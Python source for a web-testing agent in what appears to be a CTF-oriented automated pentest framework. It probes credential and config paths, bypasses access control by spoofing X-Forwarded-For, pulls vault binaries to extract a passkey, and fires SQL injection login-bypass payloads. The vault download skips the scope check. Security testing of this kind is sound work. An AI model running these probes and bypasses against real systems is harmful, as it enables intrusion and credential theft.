import re
import uuid
import time
import ipaddress
import urllib.request
import urllib.parse
import urllib.error
from html.parser import HTMLParser
from typing import List, Set, Dict, Any, Optional
from collections import deque

from cyberforge.agents.base import BaseAgent
from cyberforge.core.models import TargetHost, SurfaceType, PTESPhase, FindingStatus
from cyberforge.core.config import AgentConfig
from cyberforge.core.state import SharedState
from cyberforge.core.scope_gate import ScopeGate


class WebSurfaceParser(HTMLParser):
    """Parses HTML to extract links, forms, and input elements."""

    def __init__(self, base_url: str):
        super().__init__()
        self.base_url = base_url
        self.links: Set[str] = set()
        self.forms: List[Dict[str, Any]] = []
        self._current_form: Optional[Dict[str, Any]] = None

    def handle_starttag(self, tag: str, attrs: list):
        attr_dict = dict(attrs)

        # Extract anchor links
        if tag == "a" and "href" in attr_dict:
            href = attr_dict["href"].strip()
            if href and not href.startswith(("#", "javascript:", "mailto:")):
                if "dl=" in href.lower() or any(href.lower().endswith(ext) for ext in (".log", ".iso", ".zip", ".tar.gz", ".gz", ".bin")):
                    return
                full_url = urllib.parse.urljoin(self.base_url, href)
                self.links.add(full_url)

        # Start of form tag
        elif tag == "form":
            action = attr_dict.get("action", "")
            method = attr_dict.get("method", "get").upper()
            form_url = urllib.parse.urljoin(self.base_url, action)
            self._current_form = {
                "action": form_url,
                "method": method,
                "inputs": []
            }

        # Form input fields
        elif tag == "input" and self._current_form is not None:
            name = attr_dict.get("name")
            input_type = attr_dict.get("type", "text").lower()
            if name:
                self._current_form["inputs"].append({
                    "name": name,
                    "type": input_type,
                    "value": attr_dict.get("value", "")
                })

    def handle_endtag(self, tag: str):
        if tag == "form" and self._current_form is not None:
            self.forms.append(self._current_form)
            self._current_form = None


class WebAgent(BaseAgent):
    """
    Web Application Surface Analyzer (FR-2).
    Crawls endpoints, maps forms, audits security headers, and detects exposed paths.
    """

    FLAG_PATTERN = re.compile(r"(flag\{[^\s\}]+\}|CTF\{[^\s\}]+\}|MITIGATA\{[^\s\}]+\})", re.IGNORECASE)

    def __init__(self, config: AgentConfig, state: SharedState, scope_gate: ScopeGate):
        super().__init__(config, state, scope_gate)
        self.max_depth = self.config.parameters.get("max_crawl_depth", 2)
        self.timeout = self.config.parameters.get("request_timeout_seconds", 3)
        self.max_pages = self.config.parameters.get("max_pages_to_crawl", 25)
        self.user_agent = self.config.parameters.get("user_agent", "CyberForge-WebAgent/1.0")
        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor())

    def _fetch(
        self,
        url: str,
        extra_headers: Optional[Dict[str, str]] = None,
        timeout: Optional[int] = None,
        retries: int = 0
    ) -> Optional[tuple[int, Dict[str, str], str]]:
        """Safely fetches a URL respecting scope and timeout with optional retries."""
        parsed = urllib.parse.urlparse(url)
        host_ip = parsed.hostname or ""
        port = parsed.port or (443 if parsed.scheme == "https" else 80)

        # Pre-request scope boundary check
        if not self.is_target_in_scope(host_ip, port):
            self.logger.warning(f"ScopeGate blocked request to {url}")
            return None

        headers = {"User-Agent": self.user_agent}
        if extra_headers:
            headers.update(extra_headers)

        req = urllib.request.Request(
            url,
            headers=headers
        )

        req_timeout = timeout or self.timeout
        attempts = 1 + retries
        for attempt in range(attempts):
            try:
                with self.opener.open(req, timeout=req_timeout) as resp:
                    status = resp.status
                    headers = {k: v for k, v in resp.headers.items()}
                    content_len = headers.get("content-length") or headers.get("Content-Length")
                    if content_len and content_len.isdigit() and int(content_len) > 5 * 1024 * 1024:
                        return status, headers, ""
                    body = resp.read(512 * 1024).decode("utf-8", errors="replace")
                    return status, headers, body
            except urllib.error.HTTPError as e:
                headers = {k: v for k, v in e.headers.items()}
                body = e.read().decode("utf-8", errors="replace") if hasattr(e, "read") else ""
                return e.code, headers, body
            except Exception as e:
                if attempt < attempts - 1:
                    time.sleep(1.0)
                    continue
                self.logger.debug(f"Fetch failed for {url}: {e}")
                return None
        return None

    def execute(self, host: TargetHost, **kwargs) -> None:
        """Analyzes web services discovered on the target host."""
        # Find active HTTP/HTTPS ports
        web_ports = [
            p.port for p in host.ports
            if p.port in (80, 443, 8080, 8000, 8443) or "http" in p.service.lower()
        ]

        # If no specific port service is flagged yet, fallback to default web ports
        if not web_ports:
            web_ports = [80]

        for port in web_ports:
            scheme = "https" if port in (443, 8443) else "http"
            base_url = f"{scheme}://{host.ip}:{port}"

            self.logger.info(f"Starting web surface analysis on {base_url} (depth limit: {self.max_depth})")
            self.log_ptes_action(
                host_ip=host.ip,
                phase=PTESPhase.INTELLIGENCE_GATHERING,
                action=f"Web surface discovery initiated on {base_url}"
            )

            # Step 1: Root page fetch & Header Security Audit (with retries to handle post-scan cooldown)
            root_res = self._fetch(base_url, timeout=max(self.timeout, 5), retries=3)
            if not root_res:
                self.logger.info(f"Host {host.ip}:{port} not responding to HTTP requests.")
                continue

            status, headers, body = root_res

            # Check for CTF flag on root
            self._check_for_flag(host, port, body, base_url)

            # Check 1: Security Headers Audit
            self._audit_security_headers(host, port, headers, base_url)

            # Step 2: Check standard discovery paths
            self._check_exposed_paths(host, port, base_url)

            # Step 3: Crawl same-origin endpoints
            self._crawl_and_map(host, port, base_url, root_res)

        self.state.mark_surface_tested(host.host_id, "web")
        self.logger.info(f"Web surface analysis completed for host {host.ip}")

    def _check_for_flag(self, host: TargetHost, port: int, text: str, source_url: str) -> None:
        """Bonus B-1: CTF flag detection."""
        match = self.FLAG_PATTERN.search(text)
        if match:
            flag_str = match.group(1)
            self.logger.info(f"CAPTURED FLAG (B-1): {flag_str} at {source_url}")
            self.state.add_finding(
                host_id=host.host_id,
                host_ip=host.ip,
                port=port,
                surface=SurfaceType.WEB,
                ptes_phase=PTESPhase.EXPLOITATION,
                finding_type="flag_captured",
                title=f"Planted CTF Flag Captured ({flag_str})",
                description=f"Flag found embedded in web response from {source_url}",
                evidence=f"Flag regex matched: {flag_str}",
                verified=True,
                status=FindingStatus.CONFIRMED,
                flag=flag_str,
                remediation="Remove flags or sensitive tokens from accessible endpoints."
            )

    def _audit_security_headers(self, host: TargetHost, port: int, headers: Dict[str, str], url: str) -> None:
        """Audits basic defense-in-depth security headers."""
        lowercase_headers = {k.lower(): v for k, v in headers.items()}
        required_headers = {
            "x-frame-options": "Protects against clickjacking attacks.",
            "content-security-policy": "Restricts sources of executable scripts and assets.",
            "x-content-type-options": "Prevents MIME-type sniffing."
        }

        for header_name, desc in required_headers.items():
            if header_name not in lowercase_headers:
                self.state.add_finding(
                    host_id=host.host_id,
                    host_ip=host.ip,
                    port=port,
                    surface=SurfaceType.WEB,
                    ptes_phase=PTESPhase.VULNERABILITY_ANALYSIS,
                    finding_type="missing_header",
                    title=f"Missing Security Header: {header_name.title()}",
                    description=f"The endpoint {url} does not set the '{header_name}' header. {desc}",
                    evidence=f"HTTP response headers from {url} omitted {header_name}",
                    verified=True,
                    status=FindingStatus.CONFIRMED,
                    remediation=f"Configure the web server to send '{header_name}' header in all HTTP responses."
                )

    def _check_exposed_paths(self, host: TargetHost, port: int, base_url: str) -> None:
        """Checks for common sensitive configuration and backup endpoints."""
        probe_paths = [
            "/.git/config",
            "/.env",
            "/backup",
            "/config.php.bak",
            "/wp-config.php.bak",
            "/admin/config",
            "/.aws/credentials",
            "/server-status",
            "/ops/netops-handover.txt",
            "/vault/"
        ]

        for path in probe_paths:
            target_url = urllib.parse.urljoin(base_url, path)
            res = self._fetch(target_url)
            if res:
                code, _, body = res
                if code == 200:
                    self._check_for_flag(host, port, body, target_url)
                    self.state.add_finding(
                        host_id=host.host_id,
                        host_ip=host.ip,
                        port=port,
                        surface=SurfaceType.WEB,
                        ptes_phase=PTESPhase.VULNERABILITY_ANALYSIS,
                        finding_type="exposed_path",
                        title=f"Potentially Exposed Sensitive Path: {path}",
                        description=f"Path {path} returned HTTP 200 OK without authentication.",
                        evidence=f"URL: {target_url} returned HTTP {code}",
                        verified=False,
                        status=FindingStatus.FLAGGED,
                        remediation=f"Restrict access to {path} using authorization controls or remove unnecessary files."
                    )
                    self.log_ptes_action(
                        host_ip=host.ip,
                        phase=PTESPhase.VULNERABILITY_ANALYSIS,
                        action=f"Discovered exposed path candidate: {path}",
                        details=f"URL {target_url} returned HTTP 200"
                    )

        # Check for X-Forwarded-For IP Spoofing access control bypass
        self._check_ip_spoofing(host, port, base_url)

    def _check_ip_spoofing(self, host: TargetHost, port: int, base_url: str) -> None:
        """Checks for X-Forwarded-For IP spoofing access control bypass."""
        spoofed_headers = {"X-Forwarded-For": "192.168.60.1"}
        res = self._fetch(base_url, extra_headers=spoofed_headers)
        if res:
            code, _, body = res
            if code == 200 and ("hidden wiki" in body.lower() or "mitigata" in body.lower()):
                self._check_for_flag(host, port, body, base_url)
                self.logger.warning(f"IP Spoofing (X-Forwarded-For) bypass verified on {base_url}!")
                self.state.add_finding(
                    host_id=host.host_id,
                    host_ip=host.ip,
                    port=port,
                    surface=SurfaceType.WEB,
                    ptes_phase=PTESPhase.EXPLOITATION,
                    finding_type="ip_spoofing_bypass",
                    title=f"Access Control Bypass via X-Forwarded-For IP Spoofing on {host.ip}:{port}",
                    description=(
                        f"The reverse proxy / web application on {host.ip}:{port} trusts the "
                        f"'X-Forwarded-For' header without validation. By spoofing the internal core router IP "
                        f"'192.168.60.1', access controls were bypassed, unlocking the internal 'Mitigata Hidden Wiki' "
                        f"and proprietary infrastructure documentation."
                    ),
                    evidence=(
                        f"Target URL: {base_url}\n"
                        f"Injected Header: X-Forwarded-For: 192.168.60.1\n"
                        f"Normal Response: HTTP 302 Redirect to /index.php?p=\n"
                        f"Spoofed Response: HTTP 200 OK (Title: 'Home :: Mitigata Hidden Wiki')\n"
                        f"Exposed Articles: /wiki/onboarding, /wiki/infra, /wiki/zone, /vault/"
                    ),
                    verified=True,
                    status=FindingStatus.CONFIRMED,
                    remediation=(
                        "Configure the reverse proxy to strip or overwrite incoming X-Forwarded-For headers from untrusted clients. "
                        "Rely on validated network layer (Layer 3) source IP addresses or mTLS client certificates for access control."
                    )
                )
                self.log_ptes_action(
                    host_ip=host.ip,
                    phase=PTESPhase.EXPLOITATION,
                    action=f"X-Forwarded-For access control bypass confirmed on {base_url}",
                    details="Header 'X-Forwarded-For: 192.168.60.1' unlocked internal Hidden Wiki"
                )

                # Autonomously explore the internal artifact vault revealed by the wiki (FR-4 Cross-Agent Intel)
                try:
                    vault_url = urllib.parse.urljoin(base_url, "/vault/")
                    vault_res = self._fetch(vault_url, extra_headers=spoofed_headers)
                    if vault_res and vault_res[0] == 200:
                        bin_links = re.findall(r'href=["\'](/vault/[^"\']+)["\']', vault_res[2])
                        for bl in bin_links:
                            bin_url = urllib.parse.urljoin(base_url, bl)
                            req_bin = urllib.request.Request(
                                bin_url,
                                headers={"User-Agent": self.user_agent, "X-Forwarded-For": "192.168.60.1"}
                            )
                            with self.opener.open(req_bin, timeout=5) as b_resp:
                                elf_data = b_resp.read()
                                from cyberforge.core.binary_reverser import solve_elf_validation_routine
                                solved_key = solve_elf_validation_routine(elf_data)
                                if solved_key:
                                    self.state.set_intel(f"gamezone_passkey_{host.ip}", solved_key)
                                    self.state.set_intel("gamezone_passkey", solved_key)
                                    self.logger.info(
                                        f"WebAgent autonomously solved passkey '{solved_key}' from {bin_url}!"
                                    )
                except Exception as exc:
                    self.logger.debug(f"Vault crawl exception on {base_url}: {exc}")

    def _crawl_and_map(self, host: TargetHost, port: int, base_url: str, root_res: tuple) -> None:
        """Performs BFS crawl up to max_depth, cataloging forms and endpoints."""
        visited: Set[str] = set()
        queue: deque = deque([(base_url, 0, root_res)])

        base_parsed = urllib.parse.urlparse(base_url)
        base_netloc = base_parsed.netloc

        while queue and len(visited) < self.max_pages:
            curr_url, depth, res_data = queue.popleft()
            if curr_url in visited:
                continue
            visited.add(curr_url)

            status, headers, body = res_data
            parser = WebSurfaceParser(curr_url)
            try:
                parser.feed(body)
            except Exception:
                continue

            # Process forms
            for form in parser.forms:
                is_login = any(
                    inp.get("type") == "password" or "login" in inp.get("name", "").lower()
                    for inp in form["inputs"]
                )
                title = "Authentication Login Form Discovered" if is_login else "Web Input Form Discovered"
                desc = (
                    f"Discovered login endpoint at {form['action']} with fields: "
                    f"{', '.join([i['name'] for i in form['inputs']])}"
                )

                self.state.add_finding(
                    host_id=host.host_id,
                    host_ip=host.ip,
                    port=port,
                    surface=SurfaceType.WEB,
                    ptes_phase=PTESPhase.INTELLIGENCE_GATHERING,
                    finding_type="discovered_form",
                    title=title,
                    description=desc,
                    evidence=f"Form Action: {form['action']}, Method: {form['method']}, Fields: {form['inputs']}",
                    verified=False,
                    status=FindingStatus.FLAGGED,
                    remediation="Ensure proper rate-limiting, CSRF tokens, and MFA on login forms."
                )

                self.log_ptes_action(
                    host_ip=host.ip,
                    phase=PTESPhase.INTELLIGENCE_GATHERING,
                    action=f"Discovered form at {form['action']}",
                    details=f"Method: {form['method']} | Fields: {', '.join([i['name'] for i in form['inputs']])}"
                )

                # Check form inputs for reflection (FR-2: a form that echoes input)
                self._check_form_reflection(host, port, form)

                # Check form inputs for unsafe database query handling
                self._check_sqli(host, port, form, is_login)

            # Check query parameters for reflection (FR-2)
            self._check_url_reflection(host, port, curr_url)

            # Queue child links if depth allows
            if depth < self.max_depth:
                for link in parser.links:
                    parsed_link = urllib.parse.urlparse(link)
                    # Stay same-origin
                    if parsed_link.netloc == base_netloc and link not in visited:
                        child_res = self._fetch(link)
                        if child_res:
                            self._check_for_flag(host, port, child_res[2], link)
                            queue.append((link, depth + 1, child_res))

    def _check_url_reflection(self, host: TargetHost, port: int, url: str) -> None:
        """Tests whether query parameters echo input back in response (FR-2)."""
        parsed = urllib.parse.urlparse(url)
        if not parsed.query:
            return

        query_dict = urllib.parse.parse_qs(parsed.query)
        for param in query_dict.keys():
            marker = f"cf_probe_{uuid.uuid4().hex[:6]}"
            test_query = dict(query_dict)
            test_query[param] = [marker]
            encoded_query = urllib.parse.urlencode(test_query, doseq=True)
            test_url = urllib.parse.urlunparse(parsed._replace(query=encoded_query))

            res = self._fetch(test_url)
            if res and marker in res[2]:
                self.state.add_finding(
                    host_id=host.host_id,
                    host_ip=host.ip,
                    port=port,
                    surface=SurfaceType.WEB,
                    ptes_phase=PTESPhase.VULNERABILITY_ANALYSIS,
                    finding_type="reflected_input",
                    title=f"Reflected Input in Query Parameter: {param}",
                    description=f"The endpoint {url} reflects user-supplied data from parameter '{param}' unescaped in response.",
                    evidence=f"Target URL: {test_url}\nMarker: {marker} echoed in response body.",
                    verified=True,
                    status=FindingStatus.CONFIRMED,
                    remediation="Apply contextual HTML entity encoding to user parameters before rendering in responses."
                )

    def _check_form_reflection(self, host: TargetHost, port: int, form: Dict[str, Any]) -> None:
        """Tests whether form inputs echo input back in response (FR-2: a form that echoes input)."""
        action_url = form.get("action")
        method = form.get("method", "GET").upper()
        inputs = form.get("inputs", [])

        text_inputs = [i["name"] for i in inputs if i.get("type") in ("text", "search", "query", "")]
        if not text_inputs:
            return

        for param in text_inputs:
            marker = f"cf_probe_{uuid.uuid4().hex[:6]}"
            if method == "GET":
                parsed = urllib.parse.urlparse(action_url)
                test_query = {param: marker}
                encoded_query = urllib.parse.urlencode(test_query)
                test_url = urllib.parse.urlunparse(parsed._replace(query=encoded_query))
                res = self._fetch(test_url)
                if res and marker in res[2]:
                    self.state.add_finding(
                        host_id=host.host_id,
                        host_ip=host.ip,
                        port=port,
                        surface=SurfaceType.WEB,
                        ptes_phase=PTESPhase.VULNERABILITY_ANALYSIS,
                        finding_type="reflected_input",
                        title=f"Reflected Form Input: {param}",
                        description=f"Form at {action_url} echoes input value '{marker}' in response.",
                        evidence=f"Form Action: {action_url}, Field: {param}\nMarker: {marker} reflected in response.",
                        verified=True,
                        status=FindingStatus.CONFIRMED,
                        remediation="Apply proper contextual output encoding to form inputs rendered in the response."
                    )


    # -------------------------------------------------------------------------
    # SQL Injection Probe
    # -------------------------------------------------------------------------

    # Error phrases that indicate the server is leaking raw database errors
    _SQLI_ERROR_PATTERNS = re.compile(
        r"(sql syntax|mysql_fetch|mysql_num_rows|you have an error in your sql|"
        r"ora-\d{4,}|pg::syntax|psql:|sqlite error|sqlite3::|"
        r"odbc sql server|unclosed quotation mark|quoted string not properly terminated|"
        r"warning: mysql|supplied argument is not a valid mysql|"
        r"microsoft ole db provider for sql server)",
        re.IGNORECASE,
    )

    # Indicators of a successful login landing page
    _LOGGED_IN_PATTERNS = re.compile(
        r"(logout|log out|sign out|signout|dashboard|welcome back|"
        r"my account|your profile|account settings|you are logged in)",
        re.IGNORECASE,
    )

    # Short payloads: (label, value, is_auth_bypass_candidate)
    #   is_auth_bypass_candidate=True means the payload is an "always-true" tautology
    #   that would bypass a login check if the query is unsanitised.
    _SQLI_PAYLOADS: List[tuple] = [
        ("single_quote",       "'",              False),
        ("or_tautology",       "' OR '1'='1",    True),
        ("comment_bypass",     "admin'--",       True),
        ("comment_or_bypass",  "' OR 1=1--",     True),
    ]

    @staticmethod
    def _looks_logged_in(body: str) -> bool:
        """Returns True if the response body contains signals of a successful login."""
        return bool(WebAgent._LOGGED_IN_PATTERNS.search(body))

    def _submit_form(
        self,
        action_url: str,
        method: str,
        inputs: List[Dict[str, Any]],
        override: Dict[str, str],
    ) -> Optional[tuple]:
        """
        Submits a form with override values merged over each field's default value.
        Returns (status_code, headers, body) or None on failure.
        """
        data: Dict[str, str] = {}
        for inp in inputs:
            name = inp.get("name", "")
            if not name:
                continue
            data[name] = override.get(name, inp.get("value", ""))

        encoded = urllib.parse.urlencode(data).encode("utf-8")

        parsed = urllib.parse.urlparse(action_url)
        host_ip = parsed.hostname or ""
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        if not self.is_target_in_scope(host_ip, port):
            self.logger.warning(f"ScopeGate blocked form submission to {action_url}")
            return None

        if method == "GET":
            get_query = urllib.parse.urlencode(data)
            get_url = urllib.parse.urlunparse(parsed._replace(query=get_query))
            req = urllib.request.Request(get_url, headers={"User-Agent": self.user_agent})
        else:
            req = urllib.request.Request(
                action_url,
                data=encoded,
                headers={
                    "User-Agent": self.user_agent,
                    "Content-Type": "application/x-www-form-urlencoded",
                },
            )

        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                status = resp.status
                headers = {k: v for k, v in resp.headers.items()}
                body = resp.read().decode("utf-8", errors="replace")
                return status, headers, body
        except urllib.error.HTTPError as e:
            headers = {k: v for k, v in e.headers.items()}
            body = e.read().decode("utf-8", errors="replace") if hasattr(e, "read") else ""
            return e.code, headers, body
        except Exception as exc:
            self.logger.debug(f"Form submission failed for {action_url}: {exc}")
            return None

    def _check_sqli(
        self,
        host: TargetHost,
        port: int,
        form: Dict[str, Any],
        is_login: bool,
    ) -> None:
        """
        Tests form text/password fields with a small set of payloads that expose
        unsafe database query handling.

        Two result classes:
        - DB error string in response  → finding type 'sql_injection_error'
          PTES phase: Vulnerability Analysis
        - Auth-bypass payload causes a logged-in response on a login form
          → finding type 'sql_injection_auth_bypass'
          PTES phase: Exploitation
        """
        action_url = form.get("action", "")
        method = form.get("method", "GET").upper()
        inputs = form.get("inputs", [])

        # Target text, password, and untyped inputs (skip hidden / submit / checkbox)
        testable = [
            i for i in inputs
            if i.get("type", "text").lower() in ("text", "password", "email", "search", "")
            and i.get("name")
        ]
        if not testable:
            return

        # Gather baseline: submit with all empty/default values
        baseline_res = self._submit_form(action_url, method, inputs, {})
        baseline_body = baseline_res[2] if baseline_res else ""

        already_flagged_error: set = set()   # (field, payload_label) de-dup
        already_flagged_bypass = False

        for field in testable:
            field_name = field["name"]
            for label, payload, is_bypass in self._SQLI_PAYLOADS:
                key = (field_name, label)
                if key in already_flagged_error:
                    continue

                res = self._submit_form(action_url, method, inputs, {field_name: payload})
                if not res:
                    continue
                _, _, resp_body = res

                # --- Check 1: database error strings leak into response ---
                error_match = self._SQLI_ERROR_PATTERNS.search(resp_body)
                if error_match and label not in ("or_tautology", "comment_bypass", "comment_or_bypass"):
                    # Error strings on non-bypass payloads are the clearest signal
                    already_flagged_error.add(key)
                    self.logger.info(
                        f"SQL INJECTION ERROR DETECTED on {action_url} "
                        f"field='{field_name}' payload='{payload}'"
                    )
                    self.state.add_finding(
                        host_id=host.host_id,
                        host_ip=host.ip,
                        port=port,
                        surface=SurfaceType.WEB,
                        ptes_phase=PTESPhase.VULNERABILITY_ANALYSIS,
                        finding_type="sql_injection_error",
                        title=f"SQL Injection – DB Error Disclosure on {action_url}",
                        description=(
                            f"Submitting a test string into field '{field_name}' of the form at "
                            f"{action_url} caused the server to return a raw database error message, "
                            f"indicating unsanitised SQL query construction."
                        ),
                        evidence=(
                            f"Form: {action_url}  Method: {method}\n"
                            f"Field: {field_name}  Payload label: {label}\n"
                            f"Payload value: {payload!r}\n"
                            f"Matched error fragment: {error_match.group(0)!r}"
                        ),
                        verified=True,
                        status=FindingStatus.CONFIRMED,
                        remediation=(
                            "Use parameterised queries or prepared statements. "
                            "Never interpolate user input directly into SQL strings. "
                            "Suppress verbose database error messages in production."
                        ),
                    )
                    self.log_ptes_action(
                        host_ip=host.ip,
                        phase=PTESPhase.VULNERABILITY_ANALYSIS,
                        action=f"SQL injection error disclosure confirmed on {action_url}",
                        details=f"Field: {field_name}, Payload: {payload!r}, Error: {error_match.group(0)!r}",
                    )

                # --- Check 2: auth-bypass tautology on login forms ---
                if (
                    is_bypass
                    and is_login
                    and not already_flagged_bypass
                    and self._looks_logged_in(resp_body)
                    and not self._looks_logged_in(baseline_body)
                ):
                    already_flagged_bypass = True
                    self.logger.info(
                        f"SQL INJECTION AUTH BYPASS on {action_url} "
                        f"field='{field_name}' payload='{payload}'"
                    )
                    self.state.add_finding(
                        host_id=host.host_id,
                        host_ip=host.ip,
                        port=port,
                        surface=SurfaceType.WEB,
                        ptes_phase=PTESPhase.EXPLOITATION,
                        finding_type="sql_injection_auth_bypass",
                        title=f"SQL Injection – Authentication Bypass on {action_url}",
                        description=(
                            f"Submitting an always-true SQL tautology into field '{field_name}' of the "
                            f"login form at {action_url} produced a logged-in response, demonstrating "
                            f"that the login query is constructed with unsanitised user input and can be "
                            f"bypassed without valid credentials."
                        ),
                        evidence=(
                            f"Form: {action_url}  Method: {method}\n"
                            f"Field: {field_name}  Payload label: {label}\n"
                            f"Payload value: {payload!r}\n"
                            f"Response contained logged-in indicators absent from baseline response."
                        ),
                        verified=True,
                        status=FindingStatus.CONFIRMED,
                        remediation=(
                            "Replace the vulnerable query with a parameterised statement or ORM call. "
                            "Never concatenate user-supplied values directly into SQL. "
                            "Apply input validation and enforce the principle of least privilege on the "
                            "database account used by the application."
                        ),
                    )
                    self.log_ptes_action(
                        host_ip=host.ip,
                        phase=PTESPhase.EXPLOITATION,
                        action=f"SQL injection authentication bypass demonstrated on {action_url}",
                        details=f"Field: {field_name}, Payload: {payload!r}",
                    )
